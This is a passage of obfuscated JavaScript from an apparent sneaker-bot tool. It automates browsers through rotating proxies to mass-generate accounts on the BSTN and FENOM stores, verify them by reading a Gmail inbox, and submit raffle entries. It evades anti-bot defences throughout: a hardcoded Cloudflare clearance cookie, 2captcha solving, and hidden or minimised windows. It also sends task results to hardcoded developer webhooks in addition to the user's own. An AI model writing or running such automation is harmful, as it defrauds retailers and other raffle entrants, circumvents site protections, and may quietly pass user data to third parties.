                        await _0x2e3034(_0x8b4144, _0x410719), _0x3feae7(_0x2054d1['name'] + '\x20Task\x20' + (_0x410719 + 0x1) + '\x20/\x20' + _0x8b4144['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24);
                        var _0x3a1f18 = await _0x107feb(_0x8b4144[_0x410719], _0x2054d1, 'acc', ![]);
                        const _0x5633f2 = { 'succesDEVMSG': { 'embeds': [_0x3a1f18] } }, _0x4bc890 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x3131c6 = Math['round'](Math['random']() * (_0x246fbc['length'] - 0x1)), _0x13f25f = _0x246fbc[_0x3131c6]['split'](':');
                        const _0x490cbb = await _0x3dd4ff['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x13f25f[0x0] + ':' + _0x13f25f[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x131177 = await _0x490cbb['newPage']();
                            await _0x131177['authenticate']({
                                'username': '' + _0x13f25f[0x2],
                                'password': '' + _0x13f25f[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x131177['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x131177['setRequestInterception'](!![]), _0x131177['on']('request', _0x15c86e => {
                                _0x15c86e['resourceType']() === 'image' ? _0x15c86e['abort']() : _0x15c86e['continue']();
                            }), await _0x131177['goto']('' + _0x4bc890), await _0x131177['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x131177['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x54262e(0x7d0), console['log'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x54262e(0x190), await _0x131177['waitForSelector']('#firstname'), await _0x131177['type']('#firstname', _0x8b4144[_0x410719]['FirstName'], { 'delay': 0xf0 }), await _0x54262e(0x190), await _0x131177['type']('#lastname', _0x8b4144[_0x410719]['LastName'], { 'delay': 0xe6 }), await _0x54262e(0x190), await _0x131177['type']('#email_address', _0x8b4144[_0x410719]['Email'], { 'delay': 0x122 }), await _0x54262e(0x190), await _0x131177['type']('#password', _0x8b4144[_0x410719]['Password'], { 'delay': 0x82 }), await _0x54262e(0x1f4), await _0x131177['type']('#password-confirmation', _0x8b4144[_0x410719]['Password'], { 'delay': 0x7c }), console['log'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x54262e(0x2bc), await _0x131177['$eval']('#form-validate', _0x58b9f4 => _0x58b9f4['submit']()), await _0x54262e(0x1388);
                            const _0x5f5b2f = await _0x131177['$']('#email_address-error');
                            if (_0x5f5b2f)
                                throw new Error('Invalid\x20Email');
                            const _0x9fcf9c = await _0x131177['$']('#password-error');
                            if (_0x9fcf9c)
                                throw new Error('Invalid\x20Password');
                            await _0x131177['waitForSelector']('div.mesg-success'), _0x2e8bfc = 'no', console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20Account\x20' + _0x8b4144[_0x410719]['Email'] + '\x20Generated')), _0x3a2baa['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x8b4144[_0x410719]['Email'] + ',' + _0x8b4144[_0x410719]['Password']);
                            try {
                                _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x5633f2['succesDEVMSG']);
                            } catch {
                            }
                            await _0x459a7f(_0x1796bc, _0x5633f2['succesDEVMSG']), console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x7864c8) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20' + _0x7864c8)), _0x2983c0 = '' + _0x7864c8;
                            var _0x5965f3 = await _0x107feb(_0x8b4144[_0x410719], _0x2054d1, 'acc', !![], _0x2983c0);
                            _0x5633f2['errorDEV'] = { 'embeds': [_0x5965f3] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x5633f2['errorDEV']), await _0x459a7f(_0x491127, _0x5633f2['errorDEV']), _0x2e8bfc = 'yes';
                        } finally {
                            _0x490cbb['close']();
                            if (_0x2e8bfc == 'yes' && _0x22e41c != 0x5) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Task\x20' + (_0x410719 + 0x1) + '\x20:\x20Retrying')), _0x410719 = _0x410719 - 0x1, _0x22e41c = _0x22e41c + 0x1;
                                continue;
                            }
                            _0x2e8bfc == 'yes' && _0x22e41c >= 0x5 && (_0x29ff38(_0x8b4144[_0x410719], _0x2054d1), _0x2e8bfc = 'no', _0x22e41c = 0x0), console['log'](_0x508dba() + '\x20[' + _0x2054d1['name'] + ']\x20Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x46f8b2, _0x3b2011) {
                    var _0x4f66ee = ![], _0x388389 = [];
                    async function _0x3114a9() {
                        var _0xd464ee = new _0x5deaaa({
                            'user': _0x196f8e['masterMail'],
                            'password': _0x196f8e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4a6972(_0x2131a2) {
                            _0xd464ee['openBox']('INBOX', ![], _0x2131a2);
                        }
                        _0xd464ee['once']('ready', function () {
                            _0x4a6972(function (_0x3065ad, _0x321cb6) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3065ad)
                                    throw _0x3065ad;
                                _0xd464ee['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x2377fd, _0x5abea9) {
                                    if (!_0x5abea9 || !_0x5abea9['length'])
                                        console['log'](_0x508dba() + '\x20[' + _0x46f8b2['name'] + ']\x20No\x20mails\x20found'), _0xd464ee['end']();
                                    else {
                                        var _0x4cad0f = _0xd464ee['seq']['fetch'](_0x5abea9, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4cad0f['on']('message', function (_0x12235e, _0x3393e6) {
                                            var _0x3975ec = '(#' + _0x3393e6 + ')\x20';
                                            _0x12235e['on']('body', function (_0x504160, _0x53b078) {
                                                _0x45f099(_0x504160, (_0x131917, _0x28fcae) => {
                                                    var _0x46ea50 = _0x28fcae['text']['split']('[')[0x2], _0x484f9b = _0x46ea50['split'](']')[0x0];
                                                    _0x388389['push'](_0x484f9b);
                                                });
                                            }), _0x12235e['once']('end', function () {
                                            });
                                        }), _0x4cad0f['once']('error', function (_0x46db58) {
                                            console['log']('Fetch\x20error:\x20' + _0x46db58), _0x4f66ee = !![];
                                        }), _0x4cad0f['once']('end', function () {
                                            _0xd464ee['end'](), _0x4f66ee = !![];
                                        });
                                    }
                                });
                            });
                        }), _0xd464ee['once']('error', function (_0x439aaa) {
                            console['log'](_0x351e10['red'](_0x439aaa['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4f66ee = !![];
                        }), _0xd464ee['once']('end', async function () {
                            _0x4f66ee = !![];
                        }), _0xd464ee['connect']();
                    }
                    async function _0x9feb2a(_0x478a99, _0x4594c4, _0x4ccaf1) {
                        _0x3dd4ff['use'](_0x191e47());
                        for (var _0x12b46c = 0x0; _0x12b46c < _0x4594c4['length']; _0x12b46c++) {
                            if (_0x518b0e != 'yes')
                                var _0x518b0e = '', _0x501a26 = 0x0;
                            var _0x5f1b3d = Math['round'](Math['random']() * (_0x4ccaf1['length'] - 0x1)), _0x359f25 = _0x4ccaf1[_0x5f1b3d]['split'](':');
                            const _0x792ee6 = await _0x3dd4ff['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x359f25[0x0] + ':' + _0x359f25[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x3b004b = await _0x792ee6['newPage']();
                                await _0x3b004b['authenticate']({
                                    'username': '' + _0x359f25[0x2],
                                    'password': '' + _0x359f25[0x3]
                                }), console['log'](_0x508dba() + '\x20[' + _0x478a99['name'] + ']\x20Task\x20' + (_0x12b46c + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x3b004b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3b004b['setRequestInterception'](!![]), _0x3b004b['on']('request', _0x4e23d0 => {
                                    _0x4e23d0['resourceType']() === 'image' || _0x4e23d0['resourceType']() === 'font' || _0x4e23d0['resourceType']() === 'media' ? _0x4e23d0['abort']() : _0x4e23d0['continue']();
                                }), console['log'](_0x508dba() + '\x20[' + _0x478a99['name'] + ']\x20Task\x20' + (_0x12b46c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3b004b['goto'](_0x4594c4[_0x12b46c]), console['log'](_0x508dba() + '\x20[' + _0x478a99['name'] + ']\x20Task\x20' + (_0x12b46c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x3b004b['waitForTimeout'](0xbb8);
                                try {
                                    await _0x3b004b['waitForSelector']('.account-nav'), _0x518b0e = 'no', console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x478a99['name'] + ']\x20Task\x20' + (_0x12b46c + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x624271 = await _0x107feb(null, _0x478a99, 'ver', ![]);
                                    const _0x14541a = { 'succesDEVMSG': { 'embeds': [_0x624271] } };
                                    await _0x459a7f(_0x503745, _0x14541a['succesDEVMSG']);
                                } catch (_0x385562) {
                                    throw new Error(_0x385562);
                                }
                            } catch (_0x3815d7) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x478a99['name'] + ']\x20Task\x20' + (_0x12b46c + 0x1) + '\x20:\x20' + _0x3815d7));
                                var _0x18cd1f = _0x3815d7, _0x29f142 = await _0x107feb(null, _0x478a99, 'ver', !![], _0x18cd1f);
                                const _0xaf1db = { 'errorDEVMSG': { 'embeds': [_0x29f142] } };
                                _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0xaf1db['errorDEVMSG']), await _0x459a7f(_0x491127, _0xaf1db['errorDEVMSG']), _0x518b0e = 'yes';
                            } finally {
                                _0x792ee6['close']();
                                if (_0x518b0e == 'yes' && _0x501a26 != 0x5) {
                                    console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x478a99['name'] + ']\x20Task\x20' + (_0x12b46c + 0x1) + '\x20:\x20Retrying')), _0x12b46c = _0x12b46c - 0x1, _0x501a26 = _0x501a26 + 0x1;
                                    continue;
                                }
                                _0x518b0e == 'yes' && _0x501a26 >= 0x5 && (_0x518b0e = 'no', _0x501a26 = 0x0), console['log'](_0x508dba() + '\x20[' + _0x478a99['name'] + ']\x20Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                            }
                        }
                    }
                    try {
                        _0x3114a9();
                        while (!_0x4f66ee) {
                            await _0x54262e(0xfa0);
                        }
                        console['log']('Found\x20' + _0x388389['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x54262e(0x7d0);
                    }
                    await _0x9feb2a(_0x46f8b2, _0x388389, _0x3b2011);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x47adc4, _0x2bb2ec, _0x52eda2) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1b9a3d = 0x0; _0x1b9a3d < _0x2bb2ec['length']; _0x1b9a3d++) {
                        var _0x4961d4;
                        await _0x2e3034(_0x2bb2ec, _0x1b9a3d);
                        if (_0x21e84c != 'yes')
                            var _0x21e84c = '', _0x1ad171 = 0x0;
                        _0x3feae7(_0x47adc4['name'] + '\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20/\x20' + _0x2bb2ec['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24);
                        var _0x1390b1 = Math['round'](Math['random']() * (_0x52eda2['length'] - 0x1)), _0x49d5fa = _0x52eda2[_0x1390b1]['split'](':'), _0x2e616b;
                        try {
                            _0x2e616b = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x49d5fa[0x0] + ':' + _0x49d5fa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2e616b = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x49d5fa[0x0] + ':' + _0x49d5fa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5b62b2 = await _0x2e616b['newPage'](), _0x2ce9b = await _0x5b62b2['target']()['createCDPSession'](), { windowId: _0x32e0de } = await _0x2ce9b['send']('Browser.getWindowForTarget');
                            await _0x5b62b2['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x146dbc = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x5b62b2['authenticate']({
                                'username': '' + _0x49d5fa[0x2],
                                'password': '' + _0x49d5fa[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b62b2['goto']('' + _0x2bb2ec[_0x1b9a3d]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x5b62b2['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x2ce9b['send']('Browser.setWindowBounds', {
                                'windowId': _0x32e0de,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x54262e(0x1388), await _0x5b62b2['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5b62b2['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x54262e(0x1f4), console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Logging\x20in'), await _0x5b62b2['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x4f527f => _0x4f527f['click']()), await _0x5b62b2['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5b62b2['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x54262e(0x7d0), await _0x5b62b2['waitForSelector']('#email-login'), await _0x5b62b2['type']('#email-login', '' + _0x2bb2ec[_0x1b9a3d]['Email']), await _0x54262e(0xdac), await _0x5b62b2['waitForSelector']('#password'), await _0x5b62b2['type']('#password', '' + _0x2bb2ec[_0x1b9a3d]['Password'], { 'delay': 0xe6 }), await _0x54262e(0x157c);
                            try {
                                await _0x5b62b2['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x583a76 => _0x583a76['click']());
                            } catch {
                            }
                            try {
                                await _0x5b62b2['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x1e5300) {
                            }
                            await _0x54262e(0x3e8);
                            const _0x38c90b = await _0x5b62b2['$']('.enteredDraw_container__2KmQ_');
                            if (_0x38c90b)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2bb2ec[_0x1b9a3d]['Size']);
                            if (_0x2bb2ec[_0x1b9a3d]['Size'] != 'RANDOM') {
                                var _0x5983c8 = _0x2bb2ec[_0x1b9a3d]['Size']['replace']('.', ',');
                                const _0x2e65b2 = await _0x5b62b2['$x']('//div[contains(text(),\x20' + _0x5983c8 + ')]');
                                await _0x2e65b2[0x0]['click']();
                            } else {
                                const _0x2174df = await _0x5b62b2['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x5494ae = Math['round'](Math['random']() * (_0x2174df['length'] - 0x1));
                                await _0x2174df[_0x5494ae]['click']();
                            }
                            await _0x54262e(0x1f4);
                            const _0x1d7f4c = await _0x5b62b2['$']('.addressList_addressItem__LE2PB');
                            if (_0x1d7f4c && _0x2bb2ec[_0x1b9a3d]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Filling\x20Address'), await _0x5b62b2['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x54262e(0x5dc), await _0x5b62b2['waitForSelector']('#firstname'), await _0x5b62b2['type']('#firstname', '' + _0x2bb2ec[_0x1b9a3d]['FirstName']), await _0x54262e(0x1f4), await _0x5b62b2['waitForSelector']('#firstname'), await _0x5b62b2['type']('#lastname', '' + _0x2bb2ec[_0x1b9a3d]['LastName']), await _0x54262e(0x1f4), await _0x5b62b2['waitForSelector']('#firstname'), await _0x5b62b2['type']('#street', '' + _0x2bb2ec[_0x1b9a3d]['Address1']), await _0x54262e(0x1f4), await _0x5b62b2['waitForSelector']('#firstname'), await _0x5b62b2['type']('#houseNumber', _0x2bb2ec[_0x1b9a3d]['HouseNumber'] + '\x20' + _0x2bb2ec[_0x1b9a3d]['Address2']), await _0x54262e(0x1f4), await _0x5b62b2['waitForSelector']('#firstname'), await _0x5b62b2['select']('#country_code', '' + _0x2bb2ec[_0x1b9a3d]['Country']), await _0x54262e(0x1f4), await _0x5b62b2['type']('#postcode', '' + _0x2bb2ec[_0x1b9a3d]['Zip']), await _0x54262e(0x1f4), await _0x5b62b2['type']('#city', '' + _0x2bb2ec[_0x1b9a3d]['City']), await _0x54262e(0x1f4), await _0x5b62b2['type']('#telephone', '' + _0x2bb2ec[_0x1b9a3d]['Phone']), await _0x54262e(0x1f4), await _0x5b62b2['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x54262e(0x9c4);
                            try {
                                await _0x5b62b2['type']('#instagram_name', '' + _0x2bb2ec[_0x1b9a3d]['Follower']), await _0x5b62b2['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x54262e(0x5dc);
                            try {
                                await _0x5b62b2['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x54262e(0x5dc), await _0x5b62b2['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x18ea06 => _0x18ea06['click']()), await _0x54262e(0x1388);
                            try {
                                await _0x5b62b2['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x5b62b2['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x2bb2ec[_0x1b9a3d]['Size'] != 'RANDOM') {
                                    var _0x5983c8 = _0x2bb2ec[_0x1b9a3d]['Size']['replace']('.', ',');
                                    const _0x169c63 = await _0x5b62b2['$x']('//div[contains(text(),\x20' + _0x5983c8 + ')]');
                                    await _0x169c63[0x0]['click']();
                                } else {
                                    const _0x3f0454 = await _0x5b62b2['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x5494ae = Math['round'](Math['random']() * (_0x3f0454['length'] - 0x1));
                                    await _0x3f0454[_0x5494ae]['click']();
                                }
                                await _0x54262e(0x5dc);
                                try {
                                    await _0x5b62b2['hover']('#instagram_name'), await _0x5b62b2['type']('#instagram_name', '' + _0x2bb2ec[_0x1b9a3d]['Follower']), await _0x5b62b2['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Retrying'), await _0x5b62b2['hover']('.checkBox_boxHolder__wLGVe'), await _0x54262e(0x5dc), await _0x5b62b2['click']('.checkBox_boxHolder__wLGVe'), await _0x54262e(0x157c), await _0x5b62b2['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x839c3d => _0x839c3d['click']()), await _0x54262e(0x1388), await _0x5b62b2['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x21e84c = 'no', _0x3444cf(_0x2bb2ec[_0x1b9a3d], _0x47adc4), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x518288 = await _0x107feb(_0x2bb2ec[_0x1b9a3d], _0x47adc4, 'dev', ![]), _0x213185 = await _0x107feb(_0x2bb2ec[_0x1b9a3d], _0x47adc4, 'pub', ![]);
                            const _0x1c0cc1 = {
                                'succesDEVMSG': { 'embeds': [_0x518288] },
                                'succesPUBMSG': { 'embeds': [_0x213185] }
                            };
                            try {
                                _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x1c0cc1['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x1c0cc1['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0xf106b7, _0x1c0cc1['succesPUBMSG']);
                            } catch (_0x56d961) {
                                console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x56d961));
                            }
                        } catch (_0x244288) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20' + _0x244288)), _0x21e84c = 'yes', _0x4961d4 = '' + _0x244288;
                            var _0x405913 = await _0x107feb(_0x2bb2ec[_0x1b9a3d], _0x47adc4, 'dev', !![], _0x4961d4), _0x518288 = await _0x107feb(_0x2bb2ec[_0x1b9a3d], _0x47adc4, 'dev', ![]), _0x213185 = await _0x107feb(_0x2bb2ec[_0x1b9a3d], _0x47adc4, 'pub', ![]);
                            const _0x384530 = {
                                'succesDEVMSG': { 'embeds': [_0x518288] },
                                'succesPUBMSG': { 'embeds': [_0x213185] }
                            };
                            _0x384530['errorDEV'] = { 'embeds': [_0x405913] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x384530['errorDEV']), await _0x459a7f(_0x491127, _0x384530['errorDEV']);
                        } finally {
                            _0x2e616b['close']();
                            if (_0x21e84c == 'yes' && _0x1ad171 != 0x5) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Task\x20' + (_0x1b9a3d + 0x1) + '\x20:\x20Retrying')), _0x1b9a3d = _0x1b9a3d - 0x1, _0x1ad171 = _0x1ad171 + 0x1;
                                continue;
                            }
                            _0x21e84c == 'yes' && _0x1ad171 >= 0x5 && (_0x29ff38(_0x2bb2ec[_0x1b9a3d], _0x47adc4), _0x21e84c = 'no', _0x1ad171 = 0x0), console['log'](_0x508dba() + '\x20[' + _0x47adc4['name'] + ']\x20Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5c87cd, _0x26d6da, _0x33f28c) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xb0a4d7 = 0x0; _0xb0a4d7 < _0x26d6da['length']; _0xb0a4d7++) {
                        if (_0x41119a != 'yes')
                            var _0x41119a = '', _0x335d67 = 0x0;
                        var _0x2205fb;
                        await _0x2e3034(_0x26d6da, _0xb0a4d7), _0x3feae7(_0x5c87cd['name'] + '\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20/\x20' + _0x26d6da['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24);
                        var _0x55a603 = await _0x107feb(_0x26d6da[_0xb0a4d7], _0x5c87cd, 'acc', ![]);
                        const _0x1d0dca = { 'succesDEVMSG': { 'embeds': [_0x55a603] } }, _0x39f042 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x55cc2d = Math['round'](Math['random']() * (_0x33f28c['length'] - 0x1)), _0x4dbd9d = _0x33f28c[_0x55cc2d]['split'](':'), _0x1bb2f1;
                        try {
                            _0x1bb2f1 = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4dbd9d[0x0] + ':' + _0x4dbd9d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1bb2f1 = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4dbd9d[0x0] + ':' + _0x4dbd9d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x41fcd1 = await _0x1bb2f1['newPage']();
                            await _0x41fcd1['setViewport']({
                                'width': 0x500 + _0x1b14ea(0x1, 0x32),
                                'height': 0x2d9 + _0x1b14ea(0x1, 0x32)
                            });
                            const _0x2e06a8 = await _0x41fcd1['target']()['createCDPSession'](), { windowId: _0x4ed5a1 } = await _0x2e06a8['send']('Browser.getWindowForTarget');
                            await _0x41fcd1['authenticate']({
                                'username': '' + _0x4dbd9d[0x2],
                                'password': '' + _0x4dbd9d[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x41fcd1['goto']('' + _0x39f042, { 'waitUntil': 'networkidle2' }), await _0x54262e(0x1388), console['log'](_0x508dba() + '\x20[' + _0x5c87cd['name'] + ']\x20Task\x20' + (_0xb0a4d7 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x5e38a0 = await _0x41fcd1['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x5e38a0 && await _0x5e38a0['click']();
                            } catch {
                            }
                            await _0x2e06a8['send']('Browser.setWindowBounds', {
                                'windowId': _0x4ed5a1,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x41fcd1['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x54262e(0xfa0);
                            } catch {
